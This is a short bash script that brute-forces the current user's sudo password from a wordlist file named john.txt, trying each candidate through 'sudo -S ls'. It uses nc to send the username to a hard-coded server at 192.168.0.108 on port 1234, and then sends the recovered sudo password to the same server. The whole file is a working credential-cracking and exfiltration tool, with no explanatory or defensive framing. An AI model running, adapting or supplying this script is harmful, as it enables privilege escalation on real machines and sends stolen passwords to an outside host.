#!/bin/bash

# Server IP address
server_ip="192.168.0.108"
# Server port
server_port="1234"

echo 'Sudo bruteforce started...'

current_dir="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
file_path="$current_dir/john.txt"
username=$(whoami)

echo "Usename: $username" | nc $server_ip $server_port

while IFS= read -r password || [[ -n "$password" ]]; do
    if sudo -S ls <<< "$password"; then
        echo "Access Granted!"
        echo "Username: $username"
        echo "Sudo password: $password"
        break
    else
        echo "Access Denied: $password"
    fi
done < "$file_path"


# Server informations
echo "Sending message to server..."
echo "Server IP: $server_ip"
echo "Server port: $server_port"
echo "Sudo password: $password" | nc $server_ip $server_port
